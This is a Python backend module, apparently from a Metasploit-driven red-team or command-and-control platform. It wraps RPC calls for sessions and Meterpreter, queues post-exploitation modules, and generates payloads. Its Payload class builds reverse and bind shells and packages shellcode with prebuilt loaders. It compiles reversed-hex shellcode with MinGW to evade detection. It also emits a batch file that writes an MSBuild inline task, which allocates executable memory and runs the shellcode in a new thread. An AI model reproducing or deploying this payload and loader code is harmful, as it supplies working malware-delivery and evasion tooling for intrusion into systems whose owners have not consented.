# -*- coding: utf-8 -*-
# @File  : msgrpcBase.py
# @Date  : 2018/11/14
# @Desc  : C层,用于处理业务逻辑
import base64
import copy
import datetime
import functools
import json
import logging
import re
import socket
import subprocess
import threading
import time
import uuid
import zipfile
from pathlib import PurePosixPath
from urllib import parse
from wsgiref.util import FileWrapper

import requests
from Crypto.Cipher import AES
from apscheduler.events import *
from apscheduler.schedulers.background import BackgroundScheduler
from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer
from django.shortcuts import HttpResponse
from jinja2 import Environment, FileSystemLoader

from CONFIG import MSFLOOT, RPC_TOKEN, MSFLOOTTRUE, DEBUG, JSON_RPC_URL
from Core.configs import *
from Core.lib import Xcache, list_data_return, dict_data_return, logger, Notices, RedisClient, Geoip, is_empty_ports
from Msgrpc.serializers import SessionLibSerializer, PostModuleSerializer, BotModuleSerializer
from PostModule.lib.Configs import HANDLER_OPTION


class Aescrypt(object):
    def __init__(self, key, model, iv, encode_):
        self.encode_ = encode_
        self.model = {'ECB': AES.MODE_ECB, 'CBC': AES.MODE_CBC}[model]
        self.key = self.add_16(key)
        if model == 'ECB':
            self.aes = AES.new(self.key, self.model)  # 创建一个aes对象
        elif model == 'CBC':
            self.aes = AES.new(self.key, self.model, iv)  # 创建一个aes对象

    def add_16(self, par):
        par = par.encode(self.encode_)
        while len(par) % 16 != 0:
            par += b'\0'
        return par

    def aesencrypt(self, text):
        text = self.add_16(text)
        encrypt_text = self.aes.encrypt(text)
        return base64.encodebytes(encrypt_text).decode().strip()

    def aesdecrypt(self, text):
        text = base64.decodebytes(text.encode(self.encode_))
        decrypt_text = self.aes.decrypt(text)
        return decrypt_text.decode(self.encode_).strip('\0')


class Method(object):
    AuthLogin = 'auth.login'
    AuthLogout = 'auth.logout'
    AuthTokenList = 'auth.token_list'
    AuthTokenAdd = 'auth.token_add'
    AuthTokenGenerate = 'auth.token_generate'
    AuthTokenRemove = 'auth.token_remove'

    ConsoleCreate = 'console.create'
    ConsoleList = 'console.list'
    ConsoleDestroy = 'console.destroy'
    ConsoleRead = 'console.read'
    ConsoleWrite = 'console.write'
    ConsoleTabs = 'console.tabs'
    ConsoleSessionKill = 'console.session_kill'
    ConsoleSessionDetach = 'console.session_detach'

    CoreVersion = 'core.version'
    CoreStop = 'core.stop'
    CoreSetG = 'core.setg'
    CoreUnsetG = 'core.unsetg'
    CoreSave = 'core.save'
    CoreReloadModules = 'core.reload_modules'
    CoreModuleStats = 'core.module_stats'
    CoreAddModulePath = 'core.add_module_path'
    CoreThreadList = 'core.thread_list'
    CoreThreadKill = 'core.thread_kill'

    JobList = 'job.list'
    JobStop = 'job.stop'
    JobInfo = 'job.info'

    ModuleExploits = 'module.exploits'
    ModuleAuxiliary = 'module.auxiliary'
    ModulePayloads = 'module.payloads'
    ModuleEncoders = 'module.encoders'
    ModuleNops = 'module.nops'
    ModulePost = 'module.post'
    ModuleInfo = 'module.info'
    ModuleEvasion = 'module.evasion'
    ModuleCompatiblePayloads = 'module.compatible_payloads'
    ModuleCompatibleSessions = 'module.compatible_sessions'
    ModuleTargetCompatiblePayloads = 'module.target_compatible_payloads'
    ModuleOptions = 'module.options'
    ModuleExecute = 'module.execute'
    ModuleEncodeFormats = 'module.encode_formats'
    ModuleEncode = 'module.encode'

    PluginLoad = 'plugin.load'
    PluginUnload = 'plugin.unload'
    PluginLoaded = 'plugin.loaded'

    SessionGet = 'session.get'
    SessionList = 'session.list'
    SessionStop = 'session.stop'
    SessionShellRead = 'session.shell_read'
    SessionShellWrite = 'session.shell_write'
    SessionShellUpgrade = 'session.shell_upgrade'
    SessionRingRead = 'session.ring_read'
    SessionRingPut = 'session.ring_put'
    SessionRingLast = 'session.ring_last'
    SessionRingClear = 'session.ring_clear'
    SessionMeterpreterRead = 'session.meterpreter_read'
    SessionMeterpreterWrite = 'session.meterpreter_write'
    SessionMeterpreterSessionDetach = 'session.meterpreter_session_detach'
    SessionMeterpreterSessionKill = 'session.meterpreter_session_kill'
    SessionMeterpreterTabs = 'session.meterpreter_tabs'
    SessionMeterpreterRunSingle = 'session.meterpreter_run_single'
    SessionMeterpreterScript = 'session.meterpreter_script'
    SessionMeterpreterDirectorySeparator = 'session.meterpreter_directory_separator'
    SessionCompatibleModules = 'session.compatible_modules'
    SessionMeterpreterRouteGet = 'session.meterpreter_route_get'
    SessionMeterpreterRouteList = 'session.meterpreter_route_list'
    SessionMeterpreterPortFwdList = 'session.meterpreter_portfwd_list'
    SessionMeterpreterTransportList = 'session.meterpreter_transport_list'
    SessionMeterpreterTransportAdd = 'session.meterpreter_transport_add'
    SessionMeterpreterTransportNext = 'session.meterpreter_transport_next'
    SessionMeterpreterTransportPrev = 'session.meterpreter_transport_prev'
    SessionMeterpreterTransportSleep = 'session.meterpreter_transport_sleep'
    SessionMeterpreterTransportRemove = 'session.meterpreter_transport_remove'

    DbHosts = 'db.hosts'
    DbGetHost = 'db.get_host'
    DbReportHost = 'db.report_host'
    DbDelHost = 'db.del_host'
    DbServices = 'db.services'
    DbGetService = 'db.get_service'
    DbReportService = 'db.report_service'
    DbVulns = 'db.vulns'
    DbWorkspaces = 'db.workspaces'
    DbCurrentWorkspace = 'db.current_workspace'
    DbGetWorkspace = 'db.get_workspace'
    DbSetWorkspace = 'db.set_workspace'
    DbDelWorkspace = 'db.del_workspace'
    DbAddWorkspace = 'db.add_workspace'
    DbGetNote = 'db.get_note'
    DbGetClient = 'db.get_client'
    DbReportClient = 'db.report_client'
    DbReportNote = 'db.report_note'
    DbNotes = 'db.notes'
    DbReportAuthInfo = 'db.report_auth_info'
    DbGetAuthInfo = 'db.get_auth_info'
    DbGetRef = 'db.get_ref'
    DbDelVuln = 'db.del_vuln'
    DbDelNote = 'db.del_note'
    DbDelService = 'db.del_service'
    DbReportVuln = 'db.report_vuln'
    DbEvents = 'db.events'
    DbReportEvent = 'db.report_event'
    DbReportLoot = 'db.report_loot'
    DbLoots = 'db.loots'
    DbReportCred = 'db.report_cred'
    DbCreds = 'db.creds'
    DbImportData = 'db.import_data'
    DbGetVuln = 'db.get_vuln'
    DbClients = 'db.clients'
    DbDelClient = 'db.del_client'
    DbDriver = 'db.driver'
    DbConnect = 'db.connect'
    DbStatus = 'db.status'
    DbDisconnect = 'db.disconnect'


# 单例模式
req_session = requests.session()


class RpcClient(object):
    def __init__(self):
        pass

    @staticmethod
    def call(method=None, params=None, timeout=11):
        _headers = {
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Authorization': "Bearer {}".format(RPC_TOKEN),
        }

        data = {'jsonrpc': '2.0', 'id': 1, 'method': method}

        if params is not None:
            if isinstance(params, list):
                data['params'] = params
            else:
                logger.warning("params 必须是list类型")
                return None
        json_data = json.dumps(data)
        try:
            r = req_session.post(JSON_RPC_URL, headers=_headers, data=json_data, timeout=(1.05, timeout))
        except Exception as _:
            logger.warning('msf连接失败,检查 {} 是否可用'.format(JSON_RPC_URL))
            return None
        if r.status_code == 200:
            content = json.loads(r.content.decode('utf-8', 'ignore'))
            if content.get('error') is not None:
                logger.warning(
                    "错误码:{} 信息:{}".format(content.get('error').get('code'), content.get('error').get('message')))
                Notices.send_exception(f"MSFRPC> {content.get('error').get('message')}")
                return None
            else:
                return content.get('result')

        else:
            logger.warning("返回码:{} 结果:{}".format(r.status_code, r.content))
            return None


# EVENT_JOB_ADDED | EVENT_JOB_REMOVED | EVENT_JOB_MODIFIED |
# EVENT_JOB_EXECUTED | EVENT_JOB_ERROR | EVENT_JOB_MISSED |
# EVENT_JOB_SUBMITTED | EVENT_JOB_MAX_INSTANCES
class APSModule(object):
    """处理post python模块请求,单例模式运行"""
    _instance_lock = threading.Lock()

    def __init__(self):
        self.ModuleJobsScheduler = BackgroundScheduler()
        self.ModuleJobsScheduler.add_listener(self.deal_result)
        self.ModuleJobsScheduler.start()

    def __new__(cls, *args, **kwargs):
        if not hasattr(APSModule, "_instance"):
            with APSModule._instance_lock:
                if not hasattr(APSModule, "_instance"):
                    APSModule._instance = object.__new__(cls)
        return APSModule._instance

    def putin_post_python_module_queue(self, post_module_intent=None):
        try:
            # 存储uuid
            tmp_self_uuid = str(uuid.uuid1())

            # 清空历史记录
            post_module_intent.clean_log()

            logger.warning("模块放入列表:{} job_id: {} uuid: {}".format(post_module_intent.NAME, None, tmp_self_uuid))
            post_module_intent.module_self_uuid = tmp_self_uuid
            self.ModuleJobsScheduler.add_job(func=post_module_intent.thread_run, max_instances=1, id=tmp_self_uuid)

            # 放入缓存队列,用于后续删除任务,存储结果等
            req = {
                'broker': post_module_intent.MODULE_BROKER,
                'uuid': tmp_self_uuid,
                'module': post_module_intent,
                'time': int(time.time()),
                'job_id': None,
            }
            Xcache.create_module_task(req)
            Notices.send_info(
                "模块: {} {} 开始执行".format(post_module_intent.NAME, post_module_intent.target_str))
            return True
        except Exception as E:
            logger.error(E)
            return False

    def deal_result(self, event=None):
        flag = False
        if event.code == EVENT_JOB_ADDED:
            # print("EVENT_JOB_ADDED")
            pass
        elif event.code == EVENT_JOB_REMOVED:
            # print("EVENT_JOB_REMOVED")
            pass
        elif event.code == EVENT_JOB_MODIFIED:
            # print("EVENT_JOB_MODIFIED")
            pass
        elif event.code == EVENT_JOB_EXECUTED:  # 执行完成
            flag = self.store_executed_result(event.job_id)
        elif event.code == EVENT_JOB_ERROR:
            # print("EVENT_JOB_ERROR")
            flag = self.store_error_result(event.job_id, event.exception)
        elif event.code == EVENT_JOB_MISSED:
            # print("EVENT_JOB_MISSED")
            pass
        elif event.code == EVENT_JOB_SUBMITTED:
            # print("EVENT_JOB_SUBMITTED")
            pass
        elif event.code == EVENT_JOB_MAX_INSTANCES:
            # print("EVENT_JOB_MAX_INSTANCES")
            pass
        else:
            pass
        return flag

    @staticmethod
    def store_executed_result(task_uuid=None):
        req = Xcache.get_module_task_by_uuid(task_uuid=task_uuid)
        if req is None:
            logger.warning("缓存中无对应实例,可能已经模块已经中途退出")
            return False
        module_common_instance = req.get("module")

        # 存储运行结果
        try:
            module_common_instance.store_result_in_result_history()
            Notices.send_success(
                "模块: {} {} 执行完成".format(module_common_instance.NAME, module_common_instance.target_str))
            logger.warning("多模块实例执行完成:{}".format(module_common_instance.NAME))
            Xcache.del_module_task_by_uuid(task_uuid=task_uuid)  # 清理缓存信息
            return True
        except Exception as E:
            Xcache.del_module_task_by_uuid(task_uuid=task_uuid)  # 清理缓存信息
            logger.error("多模块实例执行异常:{} 异常信息: {}".format(module_common_instance.NAME, E))
            Notices.send_exception("模块: {} 执行异常,异常信息: {}".format(module_common_instance.NAME, E))
            logger.error(E)
            return False

    @staticmethod
    def store_error_result(task_uuid=None, exception=None):
        req = Xcache.get_module_task_by_uuid(task_uuid=task_uuid)
        Xcache.del_module_task_by_uuid(task_uuid=task_uuid)  # 清理缓存信息
        module_common_instance = req.get("module")

        # 存储运行结果
        try:
            module_common_instance.log_except(exception)
            module_common_instance.store_result_in_result_history()
            logger.error("多模块实例执行异常:{} 异常信息: {}".format(module_common_instance.NAME, exception))
            Notices.send_exception("模块: {} 执行异常,异常信息: {}".format(module_common_instance.NAME, exception))
            return True
        except Exception as E:
            logger.error("多模块实例执行异常:{} 异常信息: {}".format(module_common_instance.NAME, E))
            Notices.send_exception("模块: {} 执行异常,异常信息: {}".format(module_common_instance.NAME, E))
            logger.error(E)
            return False

    def delete_job_by_uuid(self, task_uuid=None):
        req = Xcache.get_module_task_by_uuid(task_uuid=task_uuid)
        Xcache.del_module_task_by_uuid(task_uuid=task_uuid)  # 清理缓存信息

        # 删除后台任务
        try:
            self.ModuleJobsScheduler.remove_job(task_uuid)
        except Exception as E:
            logger.error(E)

        try:
            module_common_instance = req.get("module")
        except Exception as E:
            logger.error(E)
            return False

        # 存储已经生成的结果
        try:
            module_common_instance.log_status("用户手动删除任务")
            module_common_instance.store_result_in_result_history()
        except Exception as E:
            logger.error("删除多模块实例异常:{} 异常信息: {}".format(module_common_instance.NAME, E))
            Notices.send_exception("模块: {} 执行异常,异常信息: {}".format(module_common_instance.NAME, E))
            logger.error(E)
            return False

        # 发送通知
        Notices.send_info(
            "模块: {} {} 手动删除".format(module_common_instance.NAME, module_common_instance.target_str))
        logger.warning("多模块实例手动删除:{}".format(module_common_instance.NAME))
        return True


# 单例模式运行,请勿改动
aps_module = APSModule()


class MSFModule(object):
    """处理MSF模块执行请求,结果回调"""

    def __init__(self):
        pass

    @staticmethod
    def run(module_type=None, mname=None, opts=None, runasjob=False, timeout=1800):
        """实时运行MSF模块"""
        params = [module_type,
                  mname,
                  opts,
                  runasjob,
                  timeout]
        result = RpcClient.call(Method.ModuleExecute, params)
        return result

    @staticmethod
    def putin_post_msf_module_queue(msf_module=None):
        """调用msgrpc生成job,放入列表"""

        params = [msf_module.type,
                  msf_module.mname,
                  msf_module.opts,
                  True,  # 强制设置后台运行
                  0  # 超时时间
                  ]

        result = RpcClient.call(Method.ModuleExecute, params)
        if result is None:
            Notices.send_warning(f"渗透服务连接失败,无法执行模块 :{msf_module.NAME}")
            return False
        elif result == "license expire":
            Notices.send_warning(f"License 过期,无法执行模块 :{msf_module.NAME}")
            return False

        # result 数据格式
        # {'job_id': 3, 'uuid': 'dbcb2530-95b1-0137-5100-000c2966078a', 'module': b'\x80\ub.'}

        if result.get("job_id") is None:
            logger.warning("模块实例:{} uuid: {} 创建后台任务失败".format(msf_module.NAME, result.get("uuid")))
            Notices.send_warning("模块: {} {} 创建后台任务失败,请检查输入参数".format(msf_module.NAME, msf_module.target_str))
            return False
        else:
            logger.warning(
                "模块实例放入列表:{} job_id: {} uuid: {}".format(msf_module.NAME, result.get("job_id"), result.get("uuid")))
            # 放入请求队列
            req = {
                'broker': msf_module.MODULE_BROKER,
                'uuid': result.get("uuid"),
                'module': msf_module,
                'time': int(time.time()),
                'job_id': result.get("job_id"),
            }
            Xcache.create_module_task(req)
            Notices.send_info("模块: {} {} 开始执行".format(msf_module.NAME, msf_module.target_str))
            return True

    @staticmethod
    def store_result_from_sub(message=None):
        # 回调报文数据格式
        # {
        # 'job_id': None,
        # 'uuid': '1b1a1ac0-95db-0137-5103-000c2966078a',
        # 'status': True,
        # 'message': None,
        # 'data': {'WHOAMI': 'nt authority\\system', 'IS_SYSTEM': True, }
        # }
        body = message.get('data')
        # 解析报文
        try:
            msf_module_return_dict = json.loads(body)
        except Exception as E:
            logger.error(E)
            return False

        # 获取对应模块实例
        try:
            req = Xcache.get_module_task_by_uuid(task_uuid=msf_module_return_dict.get("uuid"))
        except Exception as E:
            logger.error(E)
            return False

        if req is None:
            logger.error("未找到请求模块实例")
            logger.error(msf_module_return_dict)
            return False

        module_intent = req.get('module')
        if module_intent is None:
            logger.error("获取模块失败,body: {}".format(msf_module_return_dict))
            return False

        # 调用回调函数
        try:
            logger.warning(f"模块回调:{module_intent.NAME} "
                           f"job_id: {msf_module_return_dict.get('job_id')} "
                           f"uuid: {msf_module_return_dict.get('uuid')}")
            module_intent.clean_log()  # 清理历史结果
        except Exception as E:
            logger.error(E)
            return False

        try:
            module_intent.callback(status=msf_module_return_dict.get("status"),
                                   message=msf_module_return_dict.get("message"),
                                   data=msf_module_return_dict.get("data"))
        except Exception as E:
            Notices.send_error("模块 {} 的回调函数callhack运行异常".format(module_intent.NAME))
            logger.error(E)
        try:
            module_intent.store_result_in_result_history()  # 存储到历史记录
        except Exception as E:
            logger.error(E)

        Xcache.del_module_task_by_uuid(task_uuid=msf_module_return_dict.get("uuid"))  # 清理缓存信息
        Notices.send_success("模块: {} {} 执行完成".format(module_intent.NAME, module_intent.target_str))

    @staticmethod
    def store_monitor_from_sub(message=None):
        body = message.get('data')
        try:
            msf_module_return_dict = json.loads(body)
            req = Xcache.get_module_task_by_uuid(task_uuid=msf_module_return_dict.get("uuid"))
        except Exception as E:
            logger.error(E)
            return False

        if req is None:
            logger.error("未找到请求报文")
            logger.error(msf_module_return_dict)
            return False

        try:
            module_intent = req.get('module')
            if module_intent is None:
                logger.error("获取模块失败,body: {}".format(msf_module_return_dict))
                return False
            logger.warning(
                "模块回调:{} job_id: {} uuid: {}".format(module_intent.NAME, msf_module_return_dict.get("job_id"),
                                                     msf_module_return_dict.get("uuid")))
            module_intent.clean_log()  # 清理结果
        except Exception as E:
            logger.error(E)
            return False

        try:
            module_intent.callback(status=msf_module_return_dict.get("status"),
                                   message=msf_module_return_dict.get("message"),
                                   data=msf_module_return_dict.get("data"))
        except Exception as E:
            Notices.send_error("模块 {} 的回调函数callhack运行异常".format(module_intent.NAME))
            logger.error(E)
        Notices.send_info("模块: {} 回调执行完成".format(module_intent.NAME))
        module_intent.store_result_in_result_history()  # 存储到历史记录

    @staticmethod
    def store_log_from_sub(message=None):
        body = message.get('data')
        try:
            msf_module_logs_dict = json.loads(body)
            Notices.send(f"MSF> {msf_module_logs_dict.get('content')}", level=msf_module_logs_dict.get("level"))
        except Exception as E:
            logger.error(E)
            return False


class Payload(object):
    def __init__(self):
        # 生成所需参数
        self.path = None  # payload路径 windows/x64/meterpreter/reverse_tcp
        self.lhost = None  # LHOST
        self.lport = None  # LPORT
        self.rhost = None  # RHOST
        self.rport = None  # RPORT
        self.format = None  # exe psh-reflection elf
        # 存储所需参数
        self.link = None  # 文件链接地址

    @staticmethod
    def create(mname=None, opts=None):
        """生成payload文件"""

        # badchars = opts['BadChars'] | | ''
        # fmt = opts['Format'] | | 'raw'
        # force = opts['ForceEncode'] | | false
        # template = opts['Template'] | | nil
        # plat = opts['Platform'] | | nil
        # keep = opts['KeepTemplateWorking'] | | false
        # force = opts['ForceEncode'] | | false
        # sled_size = opts['NopSledSize'].to_i | | 0
        # iter = opts['Iterations'].to_i | | 0

        # 清理历史文件
        Payload._destroy_old_files()

        # 处理RHOST及LHOST参数
        if mname.find("reverse") > 0:
            try:
                opts.pop('RHOST')
            except Exception as _:
                pass
        elif mname.find("bind") > 0:
            try:
                opts.pop('LHOST')
            except Exception as _:
                pass

        # 处理OverrideRequestHost参数
        if opts.get('OverrideRequestHost') is True:
            opts["LHOST"] = opts['OverrideLHOST']
            opts["LPORT"] = opts['OverrideLPORT']
            Notices.send_warn("Payload包含OverrideRequestHost参数")
            Notices.send_warn(f"将LHOST 替换为 OverrideLHOST:{opts['OverrideLHOST']}")
            Notices.send_warn(f"将LPORT 替换为 OverrideLPORT:{opts['OverrideLPORT']}")
        # EXTENSIONS参数
        if "meterpreter_" in mname and opts.get('EXTENSIONS') is True:
            opts['EXTENSIONS'] = 'stdapi'

        if opts.get("Format") == "AUTO":
            if "windows" in mname:
                opts["Format"] = 'exe-src'
            elif "linux" in mname:
                opts["Format"] = 'elf'
            elif "java" in mname:
                opts["Format"] = 'jar'
            elif "python" in mname:
                opts["Format"] = 'py'
            elif "php" in mname:
                opts["Format"] = 'raw'
            else:
                context = dict_data_return(306, Payload_MSG.get(306), {})
                return context

        if opts.get("Format") in ["exe-diy", "dll-diy", "dll-mutex-diy", "elf-diy"]:
            # 生成原始payload
            tmp_type = opts.get("Format")
            opts["Format"] = "hex"
            result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
            if result is None:
                context = dict_data_return(305, Payload_MSG.get(305), {})
                return context

            byteresult = base64.b64decode(result.get('payload'))
            filename = Payload._create_payload_with_loader(mname, byteresult, payload_type=tmp_type)
            # 读取新的zip文件内容
            payloadfile = os.path.join(TMP_DIR, filename)
            if opts.get("HandlerName") is not None:
                filename = f"{opts.get('HandlerName')}_{filename}"
            byteresult = open(payloadfile, 'rb')
        elif opts.get("Format") == "msbuild":
            # 生成原始payload
            opts["Format"] = "csharp"
            result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
            if result is None:
                context = dict_data_return(305, Payload_MSG.get(305), {})
                return context
            byteresult = base64.b64decode(result.get('payload'))
            filename = Payload._create_payload_use_msbuild(mname, byteresult)
            # 读取新的zip文件内容
            payloadfile = os.path.join(TMP_DIR, filename)
            byteresult = open(payloadfile, 'rb')
        elif opts.get("Format") == "exe-src":
            opts["Format"] = "hex"
            result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
            if result is None:
                context = dict_data_return(305, Payload_MSG.get(305), {})
                return context
            byteresult = base64.b64decode(result.get('payload'))
            byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=byteresult)
            filename = "{}.exe".format(int(time.time()))
        elif opts.get("Format") == "exe-src-service":
            opts["Format"] = "hex"
            result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
            if result is None:
                context = dict_data_return(305, Payload_MSG.get(305), {})
                return context
            byteresult = base64.b64decode(result.get('payload'))  # result为None会抛异常
            byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=byteresult,
                                                          payload_type="REVERSE_HEX_AS_SERVICE")
            filename = "{}.exe".format(int(time.time()))
        else:
            file_suffix = {
                "c": "c",
                "csharp": "cs",
                "exe": "exe",
                "exe-service": "exe",
                "powershell": "ps1",
                "psh-reflection": "ps1",
                "psh-cmd": "ps1",
                "hex": "hex",
                "hta-psh": "hta",
                "raw": "raw",
                "vba": "vba",
                "vbscript": "vbs",
                "elf": None,
                "elf-so": "so",
                "jar": "jar",
                "java": "java",
                "war": "war",
                "python": "py",
                "py": "py",
                "python-reflection": "py",
            }
            result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
            if result is None:
                context = dict_data_return(305, Payload_MSG.get(305), {})
                return context
            byteresult = base64.b64decode(result.get('payload'))
            if file_suffix.get(opts.get("Format")) is None:
                filename = "{}".format(int(time.time()))
            else:
                filename = "{}.{}".format(int(time.time()), file_suffix.get(opts.get("Format")))

        response = HttpResponse(byteresult)
        response['Content-Type'] = 'application/octet-stream'
        response['Code'] = 200
        response['Message'] = parse.quote(Payload_MSG.get(201))
        # 中文特殊处理
        urlpart = parse.quote(os.path.splitext(filename)[0], 'utf-8')
        leftpart = os.path.splitext(filename)[-1]
        response['Content-Disposition'] = f"{urlpart}{leftpart}"
        return response

    @staticmethod
    def _create_payload_by_mingw(mname=None, shellcode=None, payload_type="REVERSE_HEX"):
        if payload_type == "REVERSE_HEX":
            env = Environment(loader=FileSystemLoader(Mingw.CODE_TEMPLATE_DIR))
            tpl = env.get_template('REVERSE_HEX.c')
            reverse_hex_str = bytes.decode(shellcode)[::-1]
            src = tpl.render(SHELLCODE_STR=reverse_hex_str)
        elif payload_type == "REVERSE_HEX_AS_SERVICE":
            env = Environment(loader=FileSystemLoader(Mingw.CODE_TEMPLATE_DIR))
            tpl = env.get_template('REVERSE_HEX_AS_SERVICE.c')
            reverse_hex_str = bytes.decode(shellcode)[::-1]
            src = tpl.render(SHELLCODE_STR=reverse_hex_str)
        else:
            raise Exception('unspport type')

        if mname.startswith('windows/x64'):
            arch = 'x64'
        elif mname.startswith('windows/meterpreter'):
            arch = 'x86'
        else:
            raise Exception('unspport mname')
        mingwx64 = Mingw()
        byteresult = mingwx64.compile_c(src, arch)
        mingwx64.cleanup_files()
        return byteresult

    @staticmethod
    def _create_payload_with_loader(mname=None, result=None, payload_type="exe-diy"):
        filename = "{}.zip".format(int(time.time()))

        payloadfile = os.path.join(TMP_DIR, filename)
        extraloader_filepath = None
        extra_arcname = None
        if payload_type == "exe-diy":
            arcname = "loader.exe"
            shellcode_filename = "loader.ini"
            if mname.startswith('windows/x64'):
                loaderfile = 'loader_x64.exe'
            elif mname.startswith('windows/meterpreter'):
                loaderfile = 'loader_x86.exe'
            else:
                raise Exception('unspport mname')
        elif payload_type == "dll-diy":
            arcname = "loaderdll.dll"
            shellcode_filename = "loaderdll.ini"
            if mname.startswith('windows/x64'):
                loaderfile = 'DirectDLL_x64.dll'
            elif mname.startswith('windows/meterpreter'):
                loaderfile = 'DirectDLL_x86.dll'
            else:
                raise Exception('unspport mname')
        elif payload_type == "dll-mutex-diy":
            arcname = "loaderdllmutex.dll"
            shellcode_filename = "loaderdllmutex.ini"
            if mname.startswith('windows/x64'):
                loaderfile = 'MDSDLL_x64.dll'
                extraloader = 'loader_x64.exe'
                extraloader_filepath = os.path.join(settings.BASE_DIR, PAYLOAD_LOADER_STORE_PATH, extraloader)
                extra_arcname = "loaderdllmutex.exe"
            elif mname.startswith('windows/meterpreter'):
                loaderfile = 'MDSDLL_x86.dll'
                extraloader = 'loader_x86.exe'
                extraloader_filepath = os.path.join(settings.BASE_DIR, PAYLOAD_LOADER_STORE_PATH, extraloader)
                extra_arcname = "loaderdllmutex.exe"
            else:
                raise Exception('unspport mname')
        elif payload_type == "elf-diy":
            arcname = "loader"
            shellcode_filename = "shellcode"
            if mname.startswith('linux/x64'):
                loaderfile = 'unix_sc'
            elif mname.startswith('linux/x86'):
                loaderfile = 'unix_sc_x86'
            else:
                raise Exception('unspport mname')
        else:
            arcname = "loader.exe"
            shellcode_filename = "loader.ini"
            if mname.startswith('windows/x64'):
                loaderfile = 'loader_x64.exe'
            elif mname.startswith('windows/meterpreter'):
                loaderfile = 'loader_x86.exe'
            else:
                raise Exception('unspport mname')

        loader_filepath = os.path.join(settings.BASE_DIR, PAYLOAD_LOADER_STORE_PATH, loaderfile)
        new_zip = zipfile.ZipFile(payloadfile, 'w')
        new_zip.writestr(shellcode_filename, data=result, compress_type=zipfile.ZIP_DEFLATED)
        new_zip.write(loader_filepath, arcname=arcname, compress_type=zipfile.ZIP_DEFLATED)
        if payload_type == "dll-mutex-diy":
            new_zip.write(extraloader_filepath, arcname=extra_arcname, compress_type=zipfile.ZIP_DEFLATED)
        new_zip.close()
        return filename

    @staticmethod
    def _create_payload_use_msbuild(mname=None, shellcode=None):
        filename = "{}.zip".format(int(time.time()))
        if isinstance(shellcode, bytes):
            shellcode = shellcode.decode(encoding="utf-8").replace("\n", '')

        if mname.startswith('windows/x64'):
            msbuilddllpath = """C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll"""
        elif mname.startswith('windows/meterpreter'):
            msbuilddllpath = """C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll"""
        else:
            raise Exception('unspport mname')
        filedata = f"""
echo ^<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"^>>>a.xml
echo  ^<Target Name="Hello"^>>>a.xml
echo    ^<ClassExample /^>>>a.xml
echo  ^</Target^>>>a.xml
echo  ^<UsingTask>>a.xml
echo    TaskName="ClassExample">>a.xml
echo    TaskFactory="CodeTaskFactory">>a.xml
echo    AssemblyFile="{msbuilddllpath}" ^>>>a.xml
echo    ^<Task^>>>a.xml
echo      ^<Code Type="Class" Language="cs"^>>>a.xml
echo      ^<![CDATA[>>a.xml
echo        using System;>>a.xml
echo        using System.Runtime.InteropServices;>>a.xml
echo        using Microsoft.Build.Framework;>>a.xml
echo        using Microsoft.Build.Utilities;>>a.xml
echo        public class ClassExample :  Task, ITask>>a.xml
echo        {{         >>a.xml
echo          private static UInt32 MEM_COMMIT = 0x1000;          >>a.xml
echo          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          >>a.xml
echo          [DllImport("kernel32")]>>a.xml
echo            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,>>a.xml
echo            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          >>a.xml
echo          [DllImport("kernel32")]>>a.xml
echo            private static extern IntPtr CreateThread(            >>a.xml
echo            UInt32 lpThreadAttributes,>>a.xml
echo            UInt32 dwStackSize,>>a.xml
echo            UInt32 lpStartAddress,>>a.xml
echo            IntPtr param,>>a.xml
echo            UInt32 dwCreationFlags,>>a.xml
echo            ref UInt32 lpThreadId           >>a.xml
echo            );>>a.xml
echo          [DllImport("kernel32")]>>a.xml
echo            private static extern UInt32 WaitForSingleObject(           >>a.xml
echo            IntPtr hHandle,>>a.xml
echo            UInt32 dwMilliseconds>>a.xml
echo            );          >>a.xml
echo          public override bool Execute()>>a.xml
echo          {{>>a.xml
echo            {shellcode}>>a.xml
echo              UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length,>>a.xml
echo                MEM_COMMIT, PAGE_EXECUTE_READWRITE);>>a.xml
echo              Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);>>a.xml
echo              IntPtr hThread = IntPtr.Zero;>>a.xml
echo              UInt32 threadId = 0;>>a.xml
echo              IntPtr pinfo = IntPtr.Zero;>>a.xml
echo              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);>>a.xml
echo              WaitForSingleObject(hThread, 0xFFFFFFFF);>>a.xml
echo              return true;>>a.xml
echo          }} >>a.xml
echo        }}     >>a.xml
echo      ]]^>>>a.xml
echo      ^</Code^>>>a.xml
echo    ^</Task^>>>a.xml
echo  ^</UsingTask^>>>a.xml
echo ^</Project^>>>a.xml"""

        payloadfile = os.path.join(TMP_DIR, filename)

        new_zip = zipfile.ZipFile(payloadfile, 'w')
        new_zip.writestr("cmd.bat", data=filedata, compress_type=zipfile.ZIP_DEFLATED)
        readmefilepath = os.path.join(settings.BASE_DIR, "STATICFILES", "STATIC", "msbuild.md")
        new_zip.write(readmefilepath, arcname="readme.md", compress_type=zipfile.ZIP_DEFLATED)
        new_zip.close()
        return filename

    @staticmethod
    def _destroy_old_files():
        for file in os.listdir(TMP_DIR):
            file_path = os.path.join(TMP_DIR, file)
            if os.path.isdir(file_path):
                continue
            else:
                timestamp = time.time()
                file_timestamp = os.path.getctime(file_path)
                if timestamp - file_timestamp > 3600 * 24:
                    os.remove(file_path)


class Job(object):

    @staticmethod
    def list_jobs():
        """获取后台任务列表,包括msf任务及本地多模块任务"""

        msf_jobs_dict = Job.list_msfrpc_jobs_no_cache()
        if msf_jobs_dict is None:  # msfrpc临时异常
            uncheck = True  # 跳过任务检查
            msf_jobs_dict = {}
        else:
            uncheck = False

        reqs = Xcache.list_module_tasks()
        reqs_temp = []
